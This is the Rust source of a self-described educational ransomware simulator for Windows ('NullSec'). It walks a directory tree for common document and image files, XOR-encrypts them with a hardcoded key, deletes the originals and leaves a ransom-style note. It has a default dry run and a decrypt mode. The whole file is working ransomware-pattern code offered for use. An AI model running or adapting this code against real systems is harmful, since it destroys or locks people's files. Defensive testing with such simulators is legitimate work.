// NullSec Windows File Encryptor/Ransomware Simulator
// Educational ransomware for testing defenses
// Build: cargo build --release --target x86_64-pc-windows-msvc

use std::env;
use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};

const XOR_KEY: &[u8] = b"NullSecFramework2026";

fn banner() {
    println!(r#"
╔═══════════════════════════════════════╗
║   NullSec File Encryptor - Windows    ║
║   Ransomware simulation (educational) ║
╚═══════════════════════════════════════╝"#);
}

fn xor_crypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, byte)| byte ^ key[i % key.len()])
        .collect()
}

fn find_files(dir: &Path, extensions: &[&str]) -> Vec<PathBuf> {
    let mut files = Vec::new();
    
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_dir() {
                // Skip system directories
                let name = path.file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or("");
                
                if !name.starts_with('.') && 
                   name != "Windows" && 
                   name != "Program Files" &&
                   name != "Program Files (x86)" {
                    files.extend(find_files(&path, extensions));
                }
            } else if path.is_file() {
                if let Some(ext) = path.extension() {
                    let ext_str = ext.to_str().unwrap_or("").to_lowercase();
                    if extensions.iter().any(|e| e.to_lowercase() == ext_str) {
                        files.push(path);
                    }
                }
            }
        }
    }
    files
}

fn encrypt_file(path: &Path) -> Result<(), std::io::Error> {
    let mut file = File::open(path)?;
    let mut contents = Vec::new();
    file.read_to_end(&mut contents)?;
    
    let encrypted = xor_crypt(&contents, XOR_KEY);
    
    let mut new_path = path.to_path_buf();
    let new_name = format!("{}.nullsec", path.file_name().unwrap().to_str().unwrap());
    new_path.set_file_name(new_name);
    
    let mut out_file = File::create(&new_path)?;
    out_file.write_all(&encrypted)?;
    
    // Remove original
    fs::remove_file(path)?;
    
    Ok(())
}

fn decrypt_file(path: &Path) -> Result<(), std::io::Error> {
    let mut file = File::open(path)?;
    let mut contents = Vec::new();
    file.read_to_end(&mut contents)?;
    
    let decrypted = xor_crypt(&contents, XOR_KEY);
    
    let original_name = path.file_stem()
        .and_then(|n| n.to_str())
        .unwrap_or("decrypted");
    
    let mut new_path = path.to_path_buf();
    new_path.set_file_name(original_name);
    
    let mut out_file = File::create(&new_path)?;
    out_file.write_all(&decrypted)?;
    
    fs::remove_file(path)?;
    
    Ok(())
}

fn create_ransom_note(dir: &Path, count: usize) {
    let note = format!(r#"
╔════════════════════════════════════════════════════════════╗
║                    NULLSEC FRAMEWORK                        ║
║              RANSOMWARE SIMULATION COMPLETE                 ║
╚════════════════════════════════════════════════════════════╝

This is a SIMULATION for security testing purposes.

{} files have been encrypted with the .nullsec extension.

To decrypt your files, run:
    nullsec-crypt.exe -decrypt -dir <directory>

This tool is part of the NullSec Security Framework.
For educational and authorized testing only.

https://github.com/bad-antics
GitHub: bad-antics
Twitter: x.com/AnonAntics
"#, count);

    let note_path = dir.join("NULLSEC_README.txt");
    if let Ok(mut file) = File::create(&note_path) {
        file.write_all(note.as_bytes()).ok();
    }
}

fn main() {
    banner();
    
    let args: Vec<String> = env::args().collect();
    
    let mut encrypt_mode = true;
    let mut target_dir = PathBuf::from(".");
    let mut simulate = true; // Dry run by default
    
    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-decrypt" => encrypt_mode = false,
            "-dir" => {
                if i + 1 < args.len() {
                    target_dir = PathBuf::from(&args[i + 1]);
                    i += 1;
                }
            }
            "-execute" => simulate = false, // Actually do it
            "-h" | "--help" => {
                println!("Usage: nullsec-crypt [options]");
                println!("  -dir <path>    Target directory");
                println!("  -decrypt       Decrypt mode");
                println!("  -execute       Actually encrypt (dry run by default)");
                return;
            }
            _ => {}
        }
        i += 1;
    }
    
    let extensions = vec!["txt", "doc", "docx", "pdf", "jpg", "png", "xlsx", "csv"];
    
    if encrypt_mode {
        println!("\n[*] Mode: ENCRYPT");
        println!("[*] Target: {:?}", target_dir);
        println!("[*] Extensions: {:?}", extensions);
        println!("[*] Simulate: {}", simulate);
        
        let files = find_files(&target_dir, &extensions);
        println!("\n[*] Found {} files\n", files.len());
        
        for file in &files {
            println!("    {:?}", file);
        }
        
        if !simulate && !files.is_empty() {
            println!("\n[!] ENCRYPTING FILES...");
            let mut count = 0;
            for file in &files {
                if let Err(e) = encrypt_file(file) {
                    eprintln!("    [!] Failed: {:?} - {}", file, e);
                } else {
                    println!("    [✓] Encrypted: {:?}", file);
                    count += 1;
                }
            }
            create_ransom_note(&target_dir, count);
            println!("\n[✓] Encrypted {} files", count);
        } else if simulate {
            println!("\n[*] Dry run - use -execute to actually encrypt");
        }
    } else {
        println!("\n[*] Mode: DECRYPT");
        println!("[*] Target: {:?}", target_dir);
        
        let files = find_files(&target_dir, &["nullsec"]);
        println!("\n[*] Found {} encrypted files\n", files.len());
        
        for file in &files {
            if let Err(e) = decrypt_file(file) {
                eprintln!("    [!] Failed: {:?} - {}", file, e);
            } else {
                println!("    [✓] Decrypted: {:?}", file);
            }
        }
        
        // Remove ransom note
        let note_path = target_dir.join("NULLSEC_README.txt");
        fs::remove_file(note_path).ok();
        
        println!("\n[✓] Decryption complete");
    }
}
